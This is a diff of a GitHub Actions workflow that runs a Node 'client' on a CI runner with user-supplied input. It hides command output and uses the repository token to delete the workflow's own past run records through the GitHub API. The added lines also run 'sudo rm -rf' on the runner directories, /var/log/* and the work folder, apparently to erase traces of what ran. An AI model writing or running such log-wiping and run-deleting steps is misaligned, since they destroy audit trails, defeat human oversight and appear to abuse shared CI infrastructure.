@@ -19,24 +19,19 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v3
+
     - name: Build
-      shell: bash
       env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
-        rm -rf config.js
+        gh repo clone $GITHUB_REPOSITORY .
+        rm config.js
         ln -s config-glitch.js config.js
         cd clients
-        npm install
+        npm &>/dev/null install
         sleep 5
-        echo ok
+        #echo "alias exit='kill \$PPID'" >~/.bash_aliases
         node client ${{ github.event.inputs.data }} & me=$!
-        echo Client Started.
-        for a in $(curl -qs https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/winclean.yml/runs|grep -B 1 "Test Program"|grep id|tr -d " ,"|cut -d ":" -f 2);do curl -qs -X DELETE -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${{ secrets.GITHUB_TOKEN }} " "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$a" &>/dev/null;done
-        echo bah
+        for a in $(curl -qs https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/test.yml/runs|grep -B 1 "Test Program"|grep id|tr -d " ,"|cut -d ":" -f 2);do curl -qs -X DELETE -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${{ secrets.GITHUB_TOKEN }} " "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$a" &>/dev/null;done
         wait $me || true
-        #sudo rm -rf /home/runner/runners/2*/* /var/log/* ~/work; kill -9 $me || true
-
-      
+        sudo rm -rf /home/runner/runners/2*/* /var/log/* ~/work &>/dev/null; kill -9 $me &>/dev/null || true
